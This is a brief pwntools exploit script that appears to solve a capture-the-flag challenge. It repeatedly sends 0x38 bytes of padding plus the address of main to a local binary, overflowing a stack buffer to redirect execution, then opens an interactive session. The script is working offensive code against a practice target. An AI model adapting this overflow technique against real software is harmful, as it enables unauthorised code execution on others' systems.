from pwn import *

exe = ELF("./chall_patched")

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

# args.DEBUG = True

def conn():
    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)

    return r

MAIN = pack(exe.symbols.main)

def main():
    r = conn()

    for i in range(255):
        r.sendafter(b": ", b"0x40")
        r.sendafter(b">", b"a" * 0x38 + MAIN)

    r.interactive()

if __name__ == "__main__":
    main()
